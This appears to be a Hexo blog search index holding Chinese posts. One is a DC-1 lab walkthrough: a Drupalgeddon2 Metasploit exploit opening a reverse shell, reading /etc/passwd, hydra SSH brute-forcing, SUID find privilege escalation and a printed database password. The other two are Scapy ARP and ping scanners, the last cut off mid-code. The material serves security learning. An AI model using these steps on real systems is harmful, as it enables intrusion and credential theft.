<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透测试—DC_1</title>
      <link href="/2020/04/19/shen-tou-ce-shi-dc1/"/>
      <url>/2020/04/19/shen-tou-ce-shi-dc1/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试—DC1"><a href="#渗透测试—DC1" class="headerlink" title="渗透测试—DC1"></a>渗透测试—DC1</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p>这里直接利用自己编写的Ping扫描脚本，脚本在下面网址的这篇文章中，得到了下面的输出</p><pre class="line-numbers language-html"><code class="language-html">https://valecasec.github.io/2020/04/17/scapy-ping-sao-miao/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># python Ping_Scan.py 10.87.51.0/24</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.87.51.1 is alive<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 10.87.51.19 is alive<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 本次扫描共花费 10.082071781158447 秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>得到了虚拟机所在的IP地址为：<code>10.87.51.19</code> 。</p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>使用Nmap对 <code>10.87.51.19</code> 进行端口扫描。</p><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># nmap -sV -p- 10.87.51.19</span>Starting Nmap 7.80 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2020-04-19 05:20 EDTNmap scan report <span class="token keyword">for</span> 10.87.51.19Host is up <span class="token punctuation">(</span>0.0010s latency<span class="token punctuation">)</span>.Not shown: 65531 closed portsPORT      STATE SERVICE VERSION22/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 6.0p1 Debian 4+deb7u7 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>80/tcp    <span class="token function">open</span>  http    Apache httpd 2.2.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>111/tcp   <span class="token function">open</span>  rpcbind 2-4 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>59976/tcp <span class="token function">open</span>  status  1 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100024)</span>MAC Address: 00:0C:29:90:28:A0 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 15.39 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现它开放了四个端口，这里主要对 <code>22</code> 和 <code>80</code> 端口做分析</p><h2 id="三、端口分析"><a href="#三、端口分析" class="headerlink" title="三、端口分析"></a>三、端口分析</h2><img src="https://s1.ax1x.com/2020/04/19/JKBcnI.png"><p>查看网站源代码，发现了 <code>CMS</code> 的版本号</p><pre class="line-numbers language-bash"><code class="language-bash">Drupal 7 <span class="token punctuation">(</span>http://drupal.org<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="四、漏洞利用"><a href="#四、漏洞利用" class="headerlink" title="四、漏洞利用"></a>四、漏洞利用</h2><h3 id="1、使用Metasploit获取Web权限"><a href="#1、使用Metasploit获取Web权限" class="headerlink" title="1、使用Metasploit获取Web权限"></a>1、使用<code>Metasploit</code>获取<code>Web</code>权限</h3><p>使用 <code>Metasploit</code> 对该 <code>CMS</code> 进行测试：</p><pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/unix/webapp/drupal_drupalgeddon2msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOSTS 10.87.51.19RHOSTS <span class="token operator">=</span><span class="token operator">></span> 10.87.51.19msf5 exploit<span class="token punctuation">(</span>unix/webapp/drupal_drupalgeddon2<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 10.87.51.8:4444<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>38288 bytes<span class="token punctuation">)</span> to 10.87.51.19<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>10.87.51.8:4444 -<span class="token operator">></span> 10.87.51.19:47940<span class="token punctuation">)</span> at 2020-04-19 04:43:41 -0400meterpreter <span class="token operator">></span><span class="token comment" spellcheck="true">#这里连接上了</span>meterpreter <span class="token operator">></span> <span class="token function">pwd</span>/var/www<span class="token function">whoami</span>www-data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-、获取第一个FLAG"><a href="#1-、获取第一个FLAG" class="headerlink" title="[1]、获取第一个FLAG"></a>[1]、获取第一个<code>FLAG</code></h4><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> <span class="token function">cat</span> flag1.txtEvery good CMS needs a config <span class="token function">file</span> - and so <span class="token keyword">do</span> you.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里得到的是一个非常低的权限， <code>shell</code> 登录进去，查看 <code>/etc/passwd</code></p><pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> shellProcess 5466 created.Channel 1 created.<span class="token function">cat</span> /etc/passwdroot:x:0:0:root:/root:/bin/bash<span class="token comment" spellcheck="true">#......中途省区一些，省的篇幅太大</span>Debian-exim:x:101:104::/var/spool/exim4:/bin/falsestatd:x:102:65534::/var/lib/nfs:/bin/falsemessagebus:x:103:107::/var/run/dbus:/bin/falsesshd:x:104:65534::/var/run/sshd:/usr/sbin/nologinmysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/falseflag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、使用-hydra-暴力破解用户口令"><a href="#2、使用-hydra-暴力破解用户口令" class="headerlink" title="2、使用 hydra 暴力破解用户口令"></a>2、使用 <code>hydra</code> 暴力破解用户口令</h3><p>这里看到了有一个用户是 <code>flag4</code> ，新开一个窗口，直接暴力破解口令</p><pre class="line-numbers language-bash"><code class="language-bash">root@kali:~<span class="token comment" spellcheck="true"># hydra -l flag4 -P rockyou.txt -T4 ssh://10.87.51.19</span>Hydra v9.0 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2019 by van Hauser/THC - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes.<span class="token punctuation">[</span>STATUS<span class="token punctuation">]</span> 44.00 tries/min, 44 tries <span class="token keyword">in</span> 00:01h, 14344356 to <span class="token keyword">do</span> <span class="token keyword">in</span> 5433:29h, 4 active<span class="token punctuation">[</span>STATUS<span class="token punctuation">]</span> 33.33 tries/min, 100 tries <span class="token keyword">in</span> 00:03h, 14344300 to <span class="token keyword">do</span> <span class="token keyword">in</span> 7172:10h, 4 active<span class="token punctuation">[</span>22<span class="token punctuation">]</span><span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> host: 10.87.51.19   login: flag4   password: orange1 of 1 target successfully completed, 1 valid password foundHydra <span class="token punctuation">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="token punctuation">)</span> finished at 2020-04-19 04:59:39<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在经过一段时间的爆破之后得到了用户名跟密码</p><pre class="line-numbers language-bash"><code class="language-bash">username:flag4password:orange<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-、获取第四个FLAG"><a href="#4-、获取第四个FLAG" class="headerlink" title="[4]、获取第四个FLAG"></a>[4]、获取第四个<code>FLAG</code></h4><p>这里使用上面的用户名密码登录，发现家目录下有一个<code>flag</code>文件</p><pre class="line-numbers language-bash"><code class="language-bash">flag4@DC-1:~$ <span class="token function">cat</span> flag4.txtCan you use this same method to <span class="token function">find</span> or access the flag <span class="token keyword">in</span> root?Probably. But perhaps it's not that easy.  Or maybe it is?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个时候我们继续使用上面的<code>shell</code> ，先改善一下交互界面</p><pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span>www-data@DC-1:/var/www$ <span class="token function">whoami</span><span class="token function">whoami</span>www-data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、利用SUID提权"><a href="#五、利用SUID提权" class="headerlink" title="五、利用SUID提权"></a>五、利用SUID提权</h2><p>使用账户 <code>flag4</code>，查看系统上运行的所有 <code>SUID</code> 可执行文件。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#下面这几条名都可以</span><span class="token function">find</span> / -user root -perm -4000 -print 2<span class="token operator">></span>/dev/null<span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查找文件：</p><pre class="line-numbers language-bash"><code class="language-bash">flag4@DC-1:~$ <span class="token function">find</span> / -user root -perm -4000 -print 2<span class="token operator">></span>/dev/null/bin/mount/bin/ping/bin/su/bin/ping6/bin/umount/usr/bin/chsh/usr/bin/passwd/usr/bin/newgrp/usr/bin/chfn/usr/bin/gpasswd/usr/bin/procmail/usr/bin/find/usr/sbin/exim4/usr/lib/pt_chown/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helpe/sbin/mount.nfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现 <code>find</code> 命令就具有这个权限，于是使用 <code>find</code> 命令中的参数 <code>-exec</code> 进行操作</p><pre class="line-numbers language-bash"><code class="language-bash">flag4@DC-1:~$ <span class="token function">find</span> / -type f -name flag4.txt -exec <span class="token string">"/bin/sh"</span> \<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># ls</span>flag4.txt<span class="token comment" spellcheck="true"># cd /root</span><span class="token comment" spellcheck="true"># ls</span>thefinalflag.txt<span class="token comment" spellcheck="true"># cat thefinalflag.txt</span>Well done<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>Hopefully you've enjoyed this and learned some new skills.You can <span class="token keyword">let</span> me know what you thought of this little journeyby contacting me via Twitter - @DCAU7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Additions："><a href="#Additions：" class="headerlink" title="Additions："></a>Additions：</h2><p>在 <code>/var/www/sites/default</code> 的 <code>settings</code> 文件内发现了下面这个</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$databases</span> <span class="token operator">=</span> array <span class="token punctuation">(</span>  <span class="token string">'default'</span> <span class="token operator">=</span><span class="token operator">></span>  array <span class="token punctuation">(</span>    <span class="token string">'default'</span> <span class="token operator">=</span><span class="token operator">></span>    array <span class="token punctuation">(</span>      <span class="token string">'database'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'drupaldb'</span>,      <span class="token string">'username'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'dbuser'</span>,      <span class="token string">'password'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'R0ck3t'</span>,      <span class="token string">'host'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'localhost'</span>,      <span class="token string">'port'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span>,      <span class="token string">'driver'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'mysql'</span>,      <span class="token string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span>,    <span class="token punctuation">)</span>,  <span class="token punctuation">)</span>,<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>忘了借鉴了哪几篇博客了，真是太尴尬了….</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Penetration_Test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration_Test </tag>
            
            <tag> Metasploit </tag>
            
            <tag> SUID提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scapy—ARP扫描</title>
      <link href="/2020/04/18/scapy-arp-sao-miao/"/>
      <url>/2020/04/18/scapy-arp-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="Scapy—ARP扫描"><a href="#Scapy—ARP扫描" class="headerlink" title="Scapy—ARP扫描"></a>Scapy—ARP扫描</h1><h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>在上一篇文章中，本菜鸡大概写了一下关于 <code>Ping扫描</code> ，这篇来介绍一下关于 <code>ARP扫描</code> 。</p><p><code>ARP</code> 作为一个介于二层与三层直接的协议，起到承上启下的作用，在数据包构建上也是一样， <code>ARP</code> 在 <code>Ether</code> 上面，在 <code>IP</code> 下面，不过，这里不用考虑 <code>IP</code> 。</p><p>先来构建一个基本的 <code>ARP</code> 数据包，可以看到，源 <code>IP</code> 地址与源 <code>MAC</code> 它在构建的时候会自动填写，而 <code>ARP</code> 的工作方式又是发送广播帧，当目的地址不确定是，就可以像配置默认路由一样，全部置为：<code>0</code> 。于是，我们后面的代码中，只需要发送广播帧，将地址设置为全 <code>0</code> 即可达到扫描整个网段的目的。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> ARP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>ARP  <span class="token operator">|</span><span class="token operator">></span><span class="token operator">>></span><span class="token operator">></span> _<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">###[ ARP ]### </span>  hwtype<span class="token operator">=</span> <span class="token number">0x1</span>  ptype<span class="token operator">=</span> IPv4  hwlen<span class="token operator">=</span> None  plen<span class="token operator">=</span> None  op<span class="token operator">=</span> who<span class="token operator">-</span>has  hwsrc<span class="token operator">=</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0c</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">7f</span><span class="token punctuation">:</span><span class="token number">7c</span><span class="token punctuation">:</span>ee  psrc<span class="token operator">=</span> <span class="token number">10.87</span><span class="token punctuation">.</span><span class="token number">51.3</span>  hwdst<span class="token operator">=</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span><span class="token punctuation">:</span><span class="token number">00</span>  pdst<span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、项目代码"><a href="#二、项目代码" class="headerlink" title="二、项目代码"></a>二、项目代码</h2><p>在编写代码的时候需要注意，由于 <code>ARP</code> 是二层协议，所以在导入模块的时候需要单独导入，另外负责收发包的 <code>srp</code> 模块也同样需要修改。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/17 20:34</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet <span class="token keyword">import</span> Ether<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>l2 <span class="token keyword">import</span> ARP<span class="token keyword">from</span> scapy<span class="token punctuation">.</span>sendrecv <span class="token keyword">import</span> srp<span class="token keyword">from</span> threading <span class="token keyword">import</span> Thread<span class="token keyword">from</span> ipaddress <span class="token keyword">import</span> ip_network<span class="token keyword">from</span> time <span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">scan_single</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">:</span>    packet <span class="token operator">=</span> Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">'FF:FF:FF:FF:FF:FF'</span><span class="token punctuation">)</span><span class="token operator">/</span>ARP<span class="token punctuation">(</span>op<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> pdst<span class="token operator">=</span>host<span class="token punctuation">,</span> hwdst<span class="token operator">=</span><span class="token string">'00:00:00:00:00:00'</span><span class="token punctuation">)</span>    response<span class="token punctuation">,</span> _ <span class="token operator">=</span> srp<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"IP: %s\t\tMac:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> response<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>ARP<span class="token punctuation">)</span><span class="token punctuation">.</span>fields<span class="token punctuation">[</span><span class="token string">'hwsrc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">scan_arp</span><span class="token punctuation">(</span>network<span class="token punctuation">)</span><span class="token punctuation">:</span>    ip_list <span class="token operator">=</span> ip_network<span class="token punctuation">(</span>network<span class="token punctuation">)</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> ip_list<span class="token punctuation">:</span>        t <span class="token operator">=</span> Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>scan_single<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    t1 <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        scan_arp<span class="token punctuation">(</span>host<span class="token punctuation">)</span>        t2 <span class="token operator">=</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 本次扫描共花费 %s 秒"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>t2 <span class="token operator">-</span> t1<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage:\n\tpython3 Arp_Scan.py 192.168.1.0/24"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来看看代码运行如何，花费仅仅有<code>1.5</code>s，扫描了<code>256</code>（这里没去头去尾）台主机。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost Desktop<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># python3 Arp_Scan.py 10.87.51.0/24</span>IP: 10.87.51.1             Mac:00:50:56:c0:00:08IP: 10.87.51.2             Mac:00:50:56:ea:29:0eIP: 10.87.51.19            Mac:00:0c:29:90:28:a0IP: 10.87.51.254           Mac:00:50:56:ee:e3:c7<span class="token punctuation">[</span>+<span class="token punctuation">]</span> 本次扫描共花费 1.3971431255340576 秒<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Addiction："><a href="#Addiction：" class="headerlink" title="Addiction："></a>Addiction：</h3><p>大家可以看一下乾颐堂教主的课，搭配<code>Scapy 2.4.3</code>的官方文档，那就很棒了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Scapy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Scapy </tag>
            
            <tag> ARP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scapy—Ping扫描</title>
      <link href="/2020/04/17/scapy-ping-sao-miao/"/>
      <url>/2020/04/17/scapy-ping-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="Scapy—Ping扫描"><a href="#Scapy—Ping扫描" class="headerlink" title="Scapy—Ping扫描"></a>Scapy—Ping扫描</h1><h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>最近在学 <code>Scapy</code> ，决定先从最基本的开始做起，于是有了这篇水文，先来看看文档对它的定义：</p><p><code>Scapy</code>是一个可以让用户发送、侦听和解析并伪装网络报文的<code>Python</code>程序。这些功能可以用于制作侦测、扫描和攻击网络的工具。换言之，<code>Scapy</code> 是一个强大的操纵报文的交互程序。它可以伪造或者解析多种协议的报文，还具有发送、捕获、匹配请求和响应这些报文以及更多的功能。<code>Scapy</code> 可以轻松地做到像扫描(<code>scanning</code>)、路由跟踪(<code>tracerouting</code>)、探测(<code>probing</code>)、单元测试(<code>unit tests</code>)、攻击(<code>attacks</code>)和发现网络(<code>network discorvery</code>)这样的传统任务。它可以代替<code>hping</code>，<code>arpspoof</code>，<code>arp-sk</code>，<code>arping</code>，<code>p0f</code> 甚至是部分的<code>Namp</code>，<code>tcpdump</code>和<code>tshark</code> 的功能。</p><p>我总结一句，它说的真的都能实现…</p><h3 id="1、安装Scapy"><a href="#1、安装Scapy" class="headerlink" title="1、安装Scapy"></a>1、安装<code>Scapy</code></h3><pre class="line-numbers language-bash"><code class="language-bash">pip3 <span class="token function">install</span> scapy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、数据包的基本构成"><a href="#2、数据包的基本构成" class="headerlink" title="2、数据包的基本构成"></a>2、数据包的基本构成</h3><p>数据包是从底层到高层构造的，<code>ICMP</code> 协议是应用层协议，这里要知道的是当 <code>Type</code> 为 <code>0</code> 时为 <code>echo-reply</code> ；当 <code>Type</code> 为 <code>8</code>时为 <code>echo-request</code> </p><p>先来看基本的 <code>ping</code> 命令：</p><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ <span class="token function">ping</span> -c 1 baidu.comPING baidu.com <span class="token punctuation">(</span>39.156.69.79<span class="token punctuation">)</span> 56<span class="token punctuation">(</span>84<span class="token punctuation">)</span> bytes of data.64 bytes from 39.156.69.79 <span class="token punctuation">(</span>39.156.69.79<span class="token punctuation">)</span>: icmp_seq<span class="token operator">=</span>1 ttl<span class="token operator">=</span>49 time<span class="token operator">=</span>38.4 ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以看到，上面的一条 <code>ping</code> 有显示的有序列号，生存周期，花费时间，生成周期一般都是 <code>64</code> 或 <code>128</code> ，序列号则是需要填的部分。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> p <span class="token operator">=</span> IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">'10.87.51.1'</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#这还可以换成 Ether()/IP(dst='10.87.51.1')/ICMP(),但是前面要加上以太网帧</span><span class="token operator">>></span><span class="token operator">></span> p<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">###[ IP ]###</span>  version<span class="token operator">=</span> <span class="token number">4</span>    <span class="token comment" spellcheck="true">#IP版本</span>  ihl<span class="token operator">=</span> None  tos<span class="token operator">=</span> <span class="token number">0x0</span>  len<span class="token operator">=</span> None        <span class="token comment" spellcheck="true">#长度</span>  id<span class="token operator">=</span> <span class="token number">1</span>            <span class="token comment" spellcheck="true">#id是需要填的部分</span>  flags<span class="token operator">=</span>  frag<span class="token operator">=</span> <span class="token number">0</span>  ttl<span class="token operator">=</span> <span class="token number">64</span>        <span class="token comment" spellcheck="true">#生存周期</span>  proto<span class="token operator">=</span> icmp    <span class="token comment" spellcheck="true">#协议</span>  chksum<span class="token operator">=</span> None  src<span class="token operator">=</span> <span class="token number">10.87</span><span class="token punctuation">.</span><span class="token number">51.1</span>    <span class="token comment" spellcheck="true">#源地址</span>  dst<span class="token operator">=</span> <span class="token number">10.87</span><span class="token punctuation">.</span><span class="token number">51.1</span>    <span class="token comment" spellcheck="true">#目的地址</span>  \options\<span class="token comment" spellcheck="true">###[ ICMP ]###</span>     type<span class="token operator">=</span> echo<span class="token operator">-</span>request        <span class="token comment" spellcheck="true">#类型为请求包，reply的话会变成echo-reply</span>     code<span class="token operator">=</span> <span class="token number">0</span>     chksum<span class="token operator">=</span> None     id<span class="token operator">=</span> <span class="token number">0x0</span>        <span class="token comment" spellcheck="true">#需要填的部分加一</span>     seq<span class="token operator">=</span> <span class="token number">0x0</span>        <span class="token comment" spellcheck="true">#需要填的部分加二</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、项目代码"><a href="#二、项目代码" class="headerlink" title="二、项目代码"></a>二、项目代码</h2><h3 id="1、扫描单个IP"><a href="#1、扫描单个IP" class="headerlink" title="1、扫描单个IP"></a>1、扫描单个IP</h3><p>先入门嘛，这先搞一个最基本的，扫描单个<code>IP</code> 。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/17 19:29</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet <span class="token keyword">import</span> IP<span class="token punctuation">,</span> ICMP<span class="token punctuation">,</span> sr1<span class="token keyword">from</span> random <span class="token keyword">import</span> randintip <span class="token operator">=</span> <span class="token string">'10.87.51.1'</span>ip_id <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span>icmp_id <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span>icmp_seq <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">65535</span><span class="token punctuation">)</span>packet <span class="token operator">=</span> IP<span class="token 